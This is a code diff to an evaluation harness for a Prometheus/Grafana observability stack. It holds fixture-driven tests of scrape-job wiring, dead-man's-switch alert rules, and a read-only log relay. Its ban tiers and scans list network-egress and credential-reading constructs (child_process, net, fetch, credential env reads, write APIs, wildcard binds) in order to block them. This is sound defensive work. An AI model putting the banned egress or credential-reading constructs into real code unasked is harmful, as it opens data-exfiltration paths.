+      // FIXTURE INTEGRITY: the trap must actually be present, or every clause
+      // below passes for the wrong reason.
+      const flag = '--web.listen-address=';
+      const firstAt = compose.indexOf(flag);
+      if (firstAt === -1) return 'FIXTURE: the compose must declare a listen flag at all';
+      const firstBind = compose
+        .slice(firstAt + flag.length)
+        .split('\n')[0]
+        .trim();
+      if (firstBind !== '127.0.0.1:9090') {
+        return `FIXTURE: the FIRST \`${flag}\` occurrence must be prometheus's 9090 (it is \`${firstBind}\`), otherwise the file-wide-indexOf bug this tooth exists to catch is invisible`;
+      }
+      if (FIXTURE_RELAY_PORT === 9090) {
+        return 'FIXTURE: the relay port must differ from 9090, or a detector reading the wrong flag agrees by coincidence';
+      }
+      const wrong9090 = checkRelayScrapeJobWired(relayPrometheus({ port: 9090 }), compose);
+      if (wrong9090.ok) {
+        return "a scrape target on 9090 was accepted — that is prometheus's OWN port and precisely what a file-wide `indexOf('--web.listen-address=')` returns, so this is the bug rather than a hypothetical";
+      }
+
+      if (checkRelayScrapeJobWired(relayPrometheus({ omitJob: true }), compose).ok) {
+        return 'a prometheus.yml with NO relay job was accepted — this is the pre-13r-b tree';
+      }
+      const noPath = checkRelayScrapeJobWired(relayPrometheus({ omitMetricsPath: true }), compose);
+      if (noPath.ok) {
+        return "a relay job with NO `metrics_path:` was accepted — Prometheus silently defaults to /metrics, the scrape 404s, `up` goes to 0 and the dead-man's switch sits permanently firing";
+      }
+      if (!noPath.detail.includes('/metrics')) {
+        return `the missing-metrics_path failure does not name the silent default: ${noPath.detail}`;
+      }
+      if (checkRelayScrapeJobWired(relayPrometheus({ metricsPath: '/metrics' }), compose).ok) {
+        return 'a relay job scraping `/metrics` was accepted — the daemon serves /health';
+      }
+      if (checkRelayScrapeJobWired(relayPrometheus({ port: 9999 }), compose).ok) {
+        return "a scrape target whose port is not the relay's compose bind port was accepted — co-occurrence is not wiring";
+      }
+      if (checkRelayScrapeJobWired(relayPrometheus({ host: '0.0.0.0' }), compose).ok) {
+        return 'a non-loopback scrape target host was accepted';
+      }
+
+      // AM12's decoy: a structurally PERFECT job under `x-parked:`.
+      const decoyText = relayPrometheus({ decoy: true });
+      if (!decoyText.includes(`job_name: ${RELAY_SERVICE_NAME}`)) {
+        return 'FIXTURE: the decoy must still spell the job name verbatim';
+      }
+      if (decoyText.indexOf('x-parked:') > decoyText.indexOf('scrape_configs:')) {
+        return 'FIXTURE: the decoy must sit BEFORE `scrape_configs:` to shadow a first-match search';
+      }
+      const decoy = checkRelayScrapeJobWired(decoyText, compose);
+      if (decoy.ok) {
+        return 'a relay job declared under a top-level `x-parked:` key was accepted — Prometheus never scrapes it, so a flat line scan calls a dead target wired';
+      }
+      if (!decoy.detail.includes('scrape_configs')) {
+        return `the decoy failure does not say where the job must live: ${decoy.detail}`;
+      }
+
+      if (checkRelayScrapeJobWired(relayPrometheus(), relayCompose({ omitRelay: true })).ok) {
+        return "a scrape job for a service that does not exist in the compose was accepted — that is the permanently-zero dead-man's switch the m20e-2 park existed to prevent";
+      }
+      if (checkRelayScrapeJobWired('global:\n  scrape_interval: 15s\n', compose).ok) {
+        return 'a prometheus.yml with no `scrape_configs:` key at all was accepted';
+      }
+      return null;
+    },
+  },
+  {
+    id: 'T-o',
+    // G9p. Kills every shape that satisfies "an alert rule mentions the relay"
+    // while never firing: a `gt` evaluator, `isPaused: true`, a dangling
+    // `condition:` refId, a threshold over the wrong refId, a wrong datasource,
+    // a `for:` that is not OBS-39's, a coarser group interval, a missing
+    // severity label. AND the two shapes the spec names as unbuildable: OBS-39's
+    // own rule widened with `or`, and a new rule watching both processes.
+    run() {
+      const good = checkRelayDeadMansSwitch(deadMansRulesDoc());
+      if (!good.ok) return `the committed dead-man's-switch shape was rejected: ${good.detail}`;
+
+      // FIXTURE INTEGRITY: three rules, three DIFFERENT `for:` values, with
+      // AlloyIngestStalled's 10m sitting between AlloyDown and the relay rule.
+      const doc = deadMansRulesDoc();
+      for (const needle of ['for: 60s', 'for: 10m']) {
+        if (!doc.includes(needle)) {
+          return `FIXTURE: the document must carry \`${needle}\` so a forward-scanning detector is caught`;
+        }
+      }
+      if (doc.indexOf('for: 10m') < doc.indexOf(ALLOY_UP_NEEDLE)) {
+        return "FIXTURE: AlloyIngestStalled's 10m must sit AFTER AlloyDown's expr, or the scan-direction trap is not armed";
+      }
+
+      // The spec's named-unbuildable shape #1: OBS-39's OWN rule widened.
+      const widened = checkRelayDeadMansSwitch(
+        deadMansRulesDoc({
+          alloyExpr: `${ALLOY_UP_NEEDLE} or ${RELAY_UP_NEEDLE}`,
+          omitRelayRule: true,
+        }),
+      );
+      if (widened.ok) {
+        return 'AlloyDown\'s own expr widened with `or up{job="mr-trace-relay"}` was accepted — spec:542-547 calls folding the relay into OBS-39\'s rule unbuildable, because Alloy keeps running fine when the relay dies';
+      }
+      if (!widened.detail.includes('UNBUILDABLE')) {
+        return `the widened-rule failure does not say why one rule cannot watch two processes: ${widened.detail}`;
+      }
+      // Shape #2: a NEW uid whose expr still covers both processes.
+      const bothJobs = checkRelayDeadMansSwitch(
+        deadMansRulesDoc({ relayExpr: `${ALLOY_UP_NEEDLE} or ${RELAY_UP_NEEDLE}` }),
+      );
+      if (bothJobs.ok) {
+        return 'a distinct-uid rule whose expr matches BOTH job="alloy" and job="mr-trace-relay" was accepted — a fresh uid is not a distinct rule if the expression is not distinct';
+      }
+
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ omitRelayRule: true })).ok) {
+        return 'a rules.yml with no relay rule at all was accepted — this is the pre-13r-b tree';
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayEvaluatorType: 'gt' })).ok) {
+        return 'a `gt` evaluator was accepted — `up` is 1 when the target is healthy, so `gt 1` NEVER fires while the expr, the uid, the for: and the datasource all stay correct';
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayParams: ['0'] })).ok) {
+        return 'an evaluator threshold of `0` was accepted — `up` is never below 0, so the switch cannot fire';
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayThresholdType: 'reduce' })).ok) {
+        return 'a condition node that is not a `threshold` was accepted';
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayPaused: 'true' })).ok) {
+        return '`isPaused: true` was accepted — a paused rule is provisioned, visible, and never evaluated';
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayPaused: 'false' })).ok !== true) {
+        return 'an explicit `isPaused: false` was rejected, but it is legal and equivalent to omitting the key';
+      }
+      const dangling = checkRelayDeadMansSwitch(deadMansRulesDoc({ relayCondition: 'Z' }));
+      if (dangling.ok) {
+        return 'a `condition:` naming a refId no `data:` entry declares was accepted — the quietest failure in this file: right expr, right threshold, never fires';
+      }
+      if (!dangling.detail.includes('DANGLING')) {
+        return `the dangling-refId failure does not name the mechanism: ${dangling.detail}`;
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayExpression: 'B' })).ok) {
+        return 'a threshold node applied to a refId that is NOT the one carrying the relay expr was accepted — the switch would be watching a different query entirely';
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayDatasourceUid: 'mr-loki' })).ok) {
+        return '`up` queried against a non-Prometheus datasource was accepted — the query returns No Data forever, which Grafana does not render as an alert';
+      }
+
+      // The `for:` mirror, in the direction a scan-direction bug gets wrong.
+      const forTenM = checkRelayDeadMansSwitch(deadMansRulesDoc({ relayFor: '10m' }));
+      if (forTenM.ok) {
+        return "a relay `for: 10m` was accepted — 10m is AlloyIngestStalled's value, i.e. exactly what a detector that finds AlloyDown by its expr and then scans FORWARD for a `for:` would compare against";
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayFor: '20s' })).ok) {
+        return "a relay `for: 20s` was accepted — OBS-46 defines its threshold by reference to OBS-39's, and this is a mirror, not a lower bound";
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayFor: '24h' })).ok) {
+        return 'a relay `for: 24h` was accepted — a `>=` comparison passes it, which is why the check is EQUALITY';
+      }
+
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relayUid: 'mr-alloy-down' })).ok) {
+        return "a relay rule REUSING AlloyDown's uid was accepted — Grafana keys provisioned rules by uid, so one silently replaces the other";
+      }
+      if (checkRelayDeadMansSwitch(deadMansRulesDoc({ relaySeverity: 'warning' })).ok) {
+        return "a relay rule whose `severity:` does not mirror AlloyDown's was accepted (AM19) — notification-policies.yml:8-9 routes on it, so the rule silently takes the catch-all 4h repeat interval";
+      }
+
+      const coarser = checkRelayDeadMansSwitch(
+        deadMansRulesDoc({ relayInSecondGroup: true, relayGroupInterval: '60s' }),
+      );
+      if (coarser.ok) {
+        return "the relay rule in a group with a COARSER interval than AlloyDown's was accepted — Grafana transitions state only on an evaluation boundary, so the effective pending period stretches past the `for:` both rules agree on";
+      }
+      if (
+        !checkRelayDeadMansSwitch(
+          deadMansRulesDoc({ relayInSecondGroup: true, relayGroupInterval: '20s' }),
+        ).ok
+      ) {
+        return 'the relay rule in a SEPARATE group with an EQUAL interval was rejected — that is legal, and rejecting it would force an unrelated layout decision';
+      }
+      return null;
+    },
+  },
+  {
+    id: 'T-p',
+    // G9j's three ban tiers + G9i's production surface. Kills: a global
+    // relaxation of HYGIENE_BANS (the one edit that keeps `just ci` green while
+    // making the live gate vacuous); a two-tier split that lets daemon.test.mjs
+    // open a real listener; a filename-keyed tier map that FAILS OPEN for an
+    // unclassified file; and AM7's executed write cheat, which scanned GREEN
+    // through every previously-proposed gate.
+    run() {
+      // 1. The tier tables and the file lists must not have drifted apart. This
+      //    is a STATIC assertion about this file, and it is the one that stops
+      //    the hand-edited lists silently disagreeing.
+      const declared = [...RELAY_PRODUCTION_FILES, ...RELAY_TEST_FILES];
+      for (const name of declared) {
+        const tiers = RELAY_BAN_TIERS.filter((t) => t.files.includes(name));
+        if (tiers.length !== 1) {
+          return `the declared relay file \`${name}\` resolves to ${tiers.length} ban tiers [${tiers.map((t) => t.id).join(', ') || 'none'}] — the tier tables and the file lists have drifted, and an unclassified file gets NO bans applied`;
+        }
+      }
+      for (const tier of RELAY_BAN_TIERS) {
+        for (const name of tier.files) {
+          if (!declared.includes(name)) {
+            return `the \`${tier.id}\` tier lists \`${name}\`, which is in neither RELAY_PRODUCTION_FILES nor RELAY_TEST_FILES`;
+          }
+        }
+      }
+
+      // 2. The retier KEPT what it was supposed to keep.
+      for (const kept of ['date.now(', 'node:child_process', 'node:net', `new reg${'exp('}`]) {
+        if (!DAEMON_BANS.includes(kept)) {
+          return `the DAEMON tier no longer bans \`${kept}\`. AM16(b) CUT the \`now\` seam precisely so date.now( could stay banned in every tier — the daemon reads no wall-clock time (pairing uses the host \`ts\` per OBS-43, cadence uses the timer, /health's counter is monotonic). Relaxing these is how this gate goes vacuous.`;
+        }
+      }
+      for (const relaxed of DAEMON_RELAXED_BANS) {
+        if (DAEMON_BANS.includes(relaxed)) {
+          return `the DAEMON tier still bans \`${relaxed}\`, which the daemon genuinely needs — this tooth exists to keep the relaxation MINIMAL, not to make it impossible`;
+        }
+      }
+      const daemonTest = RELAY_BAN_TIERS.find((t) => t.id === 'daemon-test');
+      for (const ban of HYGIENE_BANS) {
+        if (!daemonTest.bans.includes(ban)) {
+          return `the DAEMON-TEST tier dropped \`${ban}\`. It drives INJECTED transports and needs none of the relaxations; keeping all ${HYGIENE_BANS.length} bans is what mechanically forces the injected seam and stops a real listener on a fixed port appearing under \`node --test\`'s parallel execution.`;
+        }
+      }
+      for (const egress of DAEMON_EGRESS_BANS) {
+        if (!DAEMON_BANS.includes(egress)) {
+          return `the DAEMON tier no longer bans \`${egress}\` — that is the P5 tripwire, and dropping a needle is not the same as graduating the park`;
+        }
+      }
+
+      // 3. The good shapes are ACCEPTED, one per tier.
+      const goodFiles = [
+        { name: 'parse.mjs', source: PURE_GOOD },
+        { name: 'tail.mjs', source: PURE_GOOD },
+        { name: 'tail.test.mjs', source: PURE_GOOD },
+        { name: RELAY_BATCH_CLI_FILE, source: BATCH_CLI_GOOD },
+        { name: RELAY_DAEMON_FILE, source: DAEMON_GOOD },
+        { name: RELAY_DAEMON_TEST_FILE, source: DAEMON_TEST_GOOD },
+      ];
+      const good = checkRelayBanTiers(goodFiles);
+      if (!good.ok) return `the expected per-tier shapes were rejected: ${good.detail}`;
+      if (checkRelayBanTiers([]).ok) {
+        return 'an EMPTY relay file list was accepted — a scan of nothing passes everything';
+      }
+
+      const one = (name, source) => checkRelayBanTiers([{ name, source }]);
+
+      // 4. PURE tier keeps all 8.
+      if (one('tail.mjs', PURE_WITH_NODE_HTTP).ok) {
+        return 'a PURE-tier file importing `node:http` was accepted — the retier relaxes that needle for daemon.mjs ONLY, and a pure core that can open a socket is not a pure core';
+      }
+      if (one('parse.mjs', `${PURE_GOOD}\nsetInterval(tick, 10);`).ok) {
+        return 'a PURE-tier file calling setInterval was accepted';
+      }
+      if (one('parse.test.mjs', PURE_WITH_NODE_HTTP).ok) {
+        return 'a PURE-tier TEST file importing `node:http` was accepted — AM12 scopes the bans to relay/**, tests included';
+      }
+
+      // 5. DAEMON tier: relaxed exactly four needles, and nothing else.
+      const cheats = [
+        [DAEMON_WITH_CHILD_PROCESS, 'node:child_process'],
+        [DAEMON_WITH_DYNAMIC_REGEXP, 'the dynamic-regexp constructor'],
+        [DAEMON_WITH_DATE_NOW, 'Date.now('],
+      ];
+      for (const [source, label] of cheats) {
+        if (one(RELAY_DAEMON_FILE, source).ok) {
+          return `a daemon containing ${label} was accepted — the DAEMON tier relaxes only [${DAEMON_RELAXED_BANS.join(', ')}]`;
+        }
+      }
+      const egressCheats = [
+        [DAEMON_WITH_FETCH, 'fetch('],
+        [DAEMON_WITH_REQUEST, '.request('],
+        [DAEMON_WITH_UNDICI, 'undici'],
+      ];
+      for (const [source, label] of egressCheats) {
+        const result = one(RELAY_DAEMON_FILE, source);
+        if (result.ok) {
+          return `a daemon containing \`${label}\` was accepted — the OTLP POST client is PARKED to 13r-c, so the daemon has ZERO egress and this ban is flat`;
+        }
+        if (!result.detail.includes('P5')) {
+          return `the egress failure for \`${label}\` does not name the P5 park it is the tripwire for: ${result.detail}`;
+        }
+      }
+      const twoTimers = one(RELAY_DAEMON_FILE, DAEMON_WITH_TWO_TIMERS);
+      if (twoTimers.ok) {
+        return 'a daemon with TWO timer call sites was accepted — the relaxation exists for the single poll loop, and a second independent cadence is a second unreviewed behaviour';
+      }
+      if (one(RELAY_DAEMON_FILE, DAEMON_NO_READ.replace('setInterval', 'queueTick')).ok) {
+        return 'a daemon with ZERO timer call sites was accepted — the poll loop either does not exist or hides behind an unreviewed construct';
+      }
+
+      // 6. DAEMON-TEST tier keeps all 8 — this is what forces the injected seam.
+      const testListen = one(RELAY_DAEMON_TEST_FILE, DAEMON_TEST_WITH_LISTEN);
+      if (testListen.ok) {
+        return "a `daemon.test.mjs` containing `.listen(` was accepted — a real listener on a fixed port under `node --test`'s parallel execution is this repo's recorded global-lock flake class, and the ban is what forces the transport to be injected";
+      }
+      if (one(RELAY_DAEMON_TEST_FILE, `${DAEMON_TEST_GOOD}\nconst t = Date.now();`).ok) {
+        return 'a `daemon.test.mjs` reading the wall clock was accepted — the clock is injected';
+      }
+
+      // 7. The unclassified file: the FAIL-OPEN hole a filename-keyed map has.
+      const stray = checkRelayBanTiers([{ name: 'helper.mjs', source: PURE_WITH_NODE_HTTP }]);
+      if (stray.ok) {
+        return 'a relay .mjs in NEITHER tier was accepted — a filename-keyed tier map applies no bans at all to it, so an unlisted file is an unscanned file';
+      }
+      if (!stray.detail.includes('FAILS OPEN')) {
+        return `the unclassified-file failure does not explain the fail-open mechanism: ${stray.detail}`;
+      }
+      if (checkRelayBanTiers([{ name: 'fixtures/decoy.mjs', source: PURE_GOOD }]).ok) {
+        return 'a .mjs under `relay/fixtures/` was accepted — the directory walk is recursive precisely so a subdirectory is not an unscanned hiding place';
+      }
+
+      // 8. G9i's production surface, over the SAME helper the gate calls.
+      const clean = relayProductionProblems(RELAY_DAEMON_FILE, DAEMON_GOOD);
+      if (clean.length !== 0) {
+        return `the clean daemon shape was flagged by the production scan: ${clean.join(' || ')}`;
+      }
+      if (relayProductionProblems(RELAY_BATCH_CLI_FILE, BATCH_CLI_GOOD).length !== 0) {
+        return 'the clean batch-CLI shape was flagged by the production scan';
+      }
+      if (relayProductionProblems('parse.mjs', PURE_GOOD).length !== 0) {
+        return 'the clean pure-core shape was flagged by the production scan';
+      }
+      const surfaceCheats = [
+        [
+          DAEMON_WITH_OPEN_WRITE,
+          'a promise-API write (`await open(p, "a").write(doc)`) — AM7\'s executed cheat, which scanned GREEN because WRITE_APIS held `opensync` but not `open(`',
+        ],
+        [
+          DAEMON_WITH_CP_SYNC,
+          "a bulk `cpSync(...)` copy of the log tree — the other half of AM7's cheat",
+        ],
+        [DAEMON_WITH_WILDCARD_BIND, 'a `0.0.0.0` wildcard bind literal'],
+        [
+          DAEMON_WITH_SCHEME,
+          'a `://` scheme literal, which the remote-only Semgrep raw-URL rule matches and local `just ci` cannot catch',
+        ],
+        [DAEMON_WITH_CREDENTIAL, 'a credential-shaped env read'],
+        [
+          DAEMON_NO_READ,
+          'a shell that never calls a read API, so it cannot be confirmed to read READ-ONLY',
+        ],
+      ];
+      for (const [source, label] of surfaceCheats) {
+        if (relayProductionProblems(RELAY_DAEMON_FILE, source).length === 0) {
+          return `the production scan reported ${label} as clean`;
+        }
+      }
+      if (relayProductionProblems('tail.mjs', PURE_WITH_NODE_FS).length === 0) {
+        return 'a PURE-tier production file importing `node:fs` was reported clean — the pure core takes text in and returns data out';
+      }
+      return null;
+    },
+  },
 ];
 
 function runTeeth() {
@@ -3125,7 +5170,11 @@ export async function observabilityStackConfigEval() {
   record('C2', checkRulesAreRecordOnly(ruleFiles));
 
   // --- C3/C4/C5/C6: compose ------------------------------------------------
-  const serviceSet = record('C3', checkServiceSetExact(compose, SEVEN_SERVICES));
+  // C3 is P1, graduated: the expected set is now EIGHT. The same edit is
+  // required in checks/stack-config-checks.test.mjs (EXPECTED_SERVICE_NAMES) —
+  // that suite is spawned by G9k below and is the only place in `just ci` where
+  // it runs, so a half-done rename reds there rather than going unnoticed.
+  record('C3', checkServiceSetExact(compose, EIGHT_SERVICES));
 
   const images = composeImages(compose);
   if (images === null) {
@@ -3307,19 +5356,12 @@ export async function observabilityStackConfigEval() {
     );
   }
 
-  // --- G9g: PARK TRIPWIRE --------------------------------------------------
-  {
-    const noJob = checkNoRelayScrapeJob(prometheusYml);
-    const noRule = checkNoRelayAlertRule(alertRules);
-    const parkIntact = serviceSet.ok && noJob.ok && noRule.ok;
-    if (!parkIntact) {
-      failures.push(
-        'G9g: THE m20e-2 PARK HAS ENDED — enable the parked assertions P1-P4 named in this ' +
-          `file's header before merging. (services: ${serviceSet.detail} | scrape: ` +
-          `${noJob.detail} | alerting: ${noRule.detail})`,
-      );
-    }
-  }
+  // --- G9n/G9o/G9p: the graduated P1-P4 assertions (13r-b) ------------------
+  // P1 is C3 above; P2 is C5 above PLUS G9n (C5 alone cannot prove the relay
+  // HAS a mount — see the failure text inside G9n); P3 is G9o; P4 is G9p.
+  record('G9n', checkRelayMountMirrorsAlloy(compose));
+  record('G9o', checkRelayScrapeJobWired(prometheusYml, compose));
+  record('G9p', checkRelayDeadMansSwitch(alertRules));
 
   // --- G9h: SUPERSESSION TRIPWIRE ------------------------------------------
   if (scan.paired.length > 0) {
@@ -3340,9 +5382,26 @@ export async function observabilityStackConfigEval() {
     if (!existsSync(relayDir)) {
       failures.push(`G9j: ${RELAY_REL}/ does not exist — the relay core is unbuilt`);
     } else {
-      const present = readdirSync(relayDir)
-        .filter((f) => f.endsWith('.mjs'))
-        .sort();
+      // RECURSIVE (AM8). The previous non-recursive `readdirSync` never looked
+      // inside `relay/fixtures/`, so a `.mjs` there was scanned by nothing at
+      // all — neither the exact-set gate nor the ban tiers. A nested file
+      // arrives here as `fixtures/x.mjs`, matches no allowed name and no ban
+      // tier, and reds twice rather than hiding.
+      const walkMjs = (dir, prefix) => {
+        const out = [];
+        for (const entry of readdirSync(dir, { withFileTypes: true }).sort((a, b) =>
+          a.name < b.name ? -1 : 1,
+        )) {
+          const rel = prefix.length === 0 ? entry.name : `${prefix}/${entry.name}`;
+          if (entry.isDirectory()) {
+            out.push(...walkMjs(path.join(dir, entry.name), rel));
+            continue;
+          }
+          if (entry.name.endsWith('.mjs')) out.push(rel);
+        }
+        return out;
+      };
+      const present = walkMjs(relayDir, '');
       const allowed = new Set([...RELAY_PRODUCTION_FILES, ...RELAY_TEST_FILES]);
       for (const required of RELAY_PRODUCTION_FILES) {
         if (!present.includes(required)) {
@@ -3353,23 +5412,27 @@ export async function observabilityStackConfigEval() {
         if (!allowed.has(found)) {
           failures.push(
             `G9j: unexpected ${RELAY_REL}/${found}. The production file set is fixed; a new ` +
-              'non-test module is how the parked /health server and tail-follow daemon would ' +
-              'creep back in-slice (AM12)',
+              'non-test module (or one tucked into a subdirectory) is how a second daemon, a ' +
+              'second listener or an OTLP POST client would creep in unreviewed (AM12/AM8). Add ' +
+              'it to RELAY_PRODUCTION_FILES or RELAY_TEST_FILES **and** to exactly one ban tier ' +
+              'in the same change, or delete it.',
           );
         }
       }
 
-      // AM12's ban list is scoped to `relay/**`, so it runs over EVERY .mjs in
-      // the directory, tests included: a `setTimeout` poll or a `node:http`
-      // import smuggled into a test file is still relay code that ships.
-      for (const file of present) {
-        const lines = codeLines(readFileSync(path.join(relayDir, file), 'utf8'));
-        for (const ban of HYGIENE_BANS) {
-          if (lines.some((l) => l.includes(ban))) {
-            failures.push(`G9j (AM12): ${RELAY_REL}/${file} contains a banned construct (${ban})`);
-          }
-        }
-      }
+      // The ban list is scoped to `relay/**` and runs over EVERY .mjs in the
+      // tree, tests included: a `setTimeout` poll or a `node:http` import
+      // smuggled into a test file is still relay code that ships. 13r-b makes
+      // it THREE tiers rather than one flat list — see checkRelayBanTiers.
+      record(
+        'G9j',
+        checkRelayBanTiers(
+          present.map((file) => ({
+            name: file,
+            source: readFileSync(path.join(relayDir, file), 'utf8'),
+          })),
+        ),
+      );
 
       // OBS-45 is about the PRODUCTION surface only: a test may legitimately
       // build a fixture string naming a credential shape.
@@ -3377,48 +5440,8 @@ export async function observabilityStackConfigEval() {
         const full = path.join(relayDir, file);
         if (!existsSync(full)) continue;
         relayFilesScanned++;
-        const lines = codeLines(readFileSync(full, 'utf8'));
-        for (const surface of CREDENTIAL_SURFACE) {
-          if (lines.some((l) => l.includes(surface))) {
-            failures.push(
-              `G9i (OBS-45): ${RELAY_REL}/${file} exposes a credential surface (${surface}) — ` +
-                'the relay reads the same read-only bind mount Alloy does and must neither ' +
-                'require nor accept a module-owner credential',
-            );
-          }
-        }
-        for (const word of CREDENTIAL_WORDS) {
-          if (lines.some((l) => containsCredentialWord(l, word))) {
-            failures.push(
-              `G9i (OBS-45): ${RELAY_REL}/${file} reads a \`${word}\`-shaped value — OBS-45 ` +
-                'forbids the relay REQUIRING or ACCEPTING a module-owner credential, and an env ' +
-                'read is acceptance',
-            );
-          }
-        }
-        for (const api of WRITE_APIS) {
-          if (lines.some((l) => l.includes(api))) {
-            failures.push(
-              `G9i (OBS-45): ${RELAY_REL}/${file} calls a write API (${api}). Every relay file ` +
-                'is read-only: the batch CLI emits its document on STDOUT, so a write call has ' +
-                'no legitimate caller here',
-            );
-          }
-        }
-        if (RELAY_PURE_FILES.includes(file) && lines.some((l) => l.includes('node:fs'))) {
-          failures.push(
-            `G9i: ${RELAY_REL}/${file} imports node:fs — the pure core takes text in and returns ` +
-              'data out; all I/O belongs to the batch shell',
-          );
-        }
-        if (
-          file === RELAY_SHELL_FILE &&
-          !lines.some((l) => l.includes('readfilesync') || l.includes('readdirsync'))
-        ) {
-          failures.push(
-            `G9i: ${RELAY_REL}/${file} never reads the logs directory — a shell that reads ` +
-              'nothing cannot be confirmed to read it READ-ONLY',
-          );
+        for (const problem of relayProductionProblems(file, readFileSync(full, 'utf8'))) {
+          failures.push(problem);
         }
       }
     }
@@ -3523,6 +5546,146 @@ export async function observabilityStackConfigEval() {
     }
   }
 
+  // --- L2 (MR_OBS_STACK=1): the LIVE criterion-level proof of OBS-46 --------
+  // The static half proves the job, the port and the rule are WRITTEN. Only
+  // this proves Prometheus actually scrapes the relay successfully — i.e. that
+  // /health answers with a body Prometheus can PARSE. A 200 carrying `ok`, or a
+  // `204 No Content`, both yield `up=0` (measured against prom/prometheus:
+  // v3.13.2), which pins the dead-man's switch permanently firing while every
+  // gate above stays green. L1 (`GET /health` -> 200) is deliberately NOT run:
+  // it is strictly implied by a target reporting `health: "up"`.
+  //
+  // The skip is STATED, never silent (the metrics-contract eval's idiom).
+  let liveNote =
+    'L2 skipped by design (MR_OBS_STACK != 1: a booted compose stack is a separate ' +
+    'precondition); every static gate above ran unconditionally';
+  if (process.env.MR_OBS_STACK === '1') {
+    // SEAM, live half only, and MANDATORY rather than optional: Docker Desktop
+    // scopes `network_mode: host` to its own VM, so the stack's loopback
+    // endpoints are unreachable from WSL-native Node. MR_OBS_PROM_FETCH supplies
+    // an argv vector that CAN reach them (e.g. a `docker run --network host`
+    // curl); the real single-box deployment needs no override and keeps the
+    // in-process fetch. It is a JSON ARGV ARRAY — never a shell string.
+    const targetsUrl = ['http', ':', '//', '127.0.0.1:9090', '/api/v1/targets'].join('');
+    let fetchArgv = null;
+    let seamBroken = false;
+    const rawFetchArgv = process.env.MR_OBS_PROM_FETCH;
+    if (rawFetchArgv !== undefined && rawFetchArgv.trim().length > 0) {
+      let parsedArgv;
+      let parsedOk = true;
+      try {
+        parsedArgv = JSON.parse(rawFetchArgv);
+      } catch (e) {
+        parsedOk = false;
+        seamBroken = true;
+        failures.push(
+          'LIVE L2: MR_OBS_PROM_FETCH is set but does not parse as JSON ' +
+            `(${e?.message ?? String(e)}). It must be a JSON ARGV ARRAY, never a shell string.`,
+        );
+      }
+      if (parsedOk) {
+        const isArgv =
+          Array.isArray(parsedArgv) &&
+          parsedArgv.length > 0 &&
+          parsedArgv.every((a) => typeof a === 'string' && a.length > 0);
+        if (!isArgv) {
+          seamBroken = true;
+          failures.push(
+            'LIVE L2: MR_OBS_PROM_FETCH must be a JSON array of one or more non-empty strings ' +
+              '(argv[0] plus its arguments; the targets URL is appended by this eval). A shell ' +
+              'string is never accepted, and a misconfigured seam must not silently fall back ' +
+              'to an in-process fetch that cannot reach the Docker Desktop VM anyway.',
+          );
+        } else {
+          fetchArgv = parsedArgv;
+        }
+      }
+    }
+
+    let body = null;
+    try {
+      if (seamBroken) throw new Error('the MR_OBS_PROM_FETCH seam is misconfigured (see above)');
+      if (fetchArgv === null) {
+        const res = await fetch(targetsUrl);
+        if (!res.ok) throw new Error(`GET /api/v1/targets returned HTTP ${res.status}`);
+        body = await res.text();
+      } else {
+        const run = spawnSync(fetchArgv[0], [...fetchArgv.slice(1), targetsUrl], {
+          encoding: 'utf8',
+          stdio: 'pipe',
+          timeout: 30_000,
+          maxBuffer: 32 * 1024 * 1024,
+        });
+        if (run.error !== undefined && run.error !== null) {
+          throw new Error(
+            `MR_OBS_PROM_FETCH '${fetchArgv[0]}' failed to spawn — ${run.error.message}`,
+          );
+        }
+        if (run.status !== 0) {
+          throw new Error(
+            `MR_OBS_PROM_FETCH exited ${run.status}: ${`${run.stderr ?? ''}`.trim().slice(0, 200)}`,
+          );
+        }
+        body = run.stdout ?? '';
+        if (body.trim().length === 0) {
+          throw new Error(
+            'MR_OBS_PROM_FETCH produced EMPTY stdout — an unread endpoint is not an absent target',
+          );
+        }
+      }
+    } catch (e) {
+      body = null;
+      failures.push(
+        `LIVE L2: could not read Prometheus's target list — ${e?.message ?? String(e)}`,
+      );
+    }
+
+    if (body !== null) {
+      let parsed = null;
+      try {
+        parsed = JSON.parse(body);
+      } catch (e) {
+        failures.push(`LIVE L2: /api/v1/targets did not return JSON (${e?.message ?? String(e)})`);
+      }
+      const active = parsed?.data?.activeTargets;
+      if (!Array.isArray(active) || active.length === 0) {
+        if (parsed !== null) {
+          failures.push(
+            'LIVE L2: /api/v1/targets reported ZERO active targets — an empty list is not a ' +
+              'healthy stack, and it would make the clause below vacuous',
+          );
+        }
+      } else {
+        const relayTargets = active.filter((t) => t?.labels?.job === RELAY_SERVICE_NAME);
+        if (relayTargets.length !== 1) {
+          failures.push(
+            `LIVE L2 (OBS-46): Prometheus reports ${relayTargets.length} active targets with ` +
+              `job="${RELAY_SERVICE_NAME}"; exactly 1 is expected. Jobs seen: ` +
+              `[${[...new Set(active.map((t) => t?.labels?.job))].join(', ')}]. The static G9o ` +
+              'gate proves the job is WRITTEN; only this proves Prometheus loaded it.',
+          );
+        } else if (relayTargets[0].health !== 'up') {
+          failures.push(
+            `LIVE L2 (OBS-46): the \`${RELAY_SERVICE_NAME}\` target reports health ` +
+              `\`${relayTargets[0].health}\` (lastError: ` +
+              `${JSON.stringify(relayTargets[0].lastError ?? '')}). This is the ONE check that ` +
+              'catches a /health body Prometheus cannot parse: a 200 whose body is `ok`, and a ' +
+              '204 No Content, BOTH scrape to up=0 while every static gate stays green — and ' +
+              "up=0 pins the dead-man's switch permanently firing, which is precisely the " +
+              'failure the m20e-2 park warned about. Serve a valid exposition document (the ' +
+              'label-free ' +
+              '`mr_trace_relay_lines_read_total` counter).',
+          );
+        } else {
+          liveNote =
+            `L2 LIVE: Prometheus reports the \`${RELAY_SERVICE_NAME}\` target ` +
+            `\`${relayTargets[0].scrapeUrl ?? '(url unknown)'}\` as health="up" among ` +
+            `${active.length} active targets`;
+        }
+      }
+    }
+  }
+
   // --- T-g: non-vacuity floor ----------------------------------------------
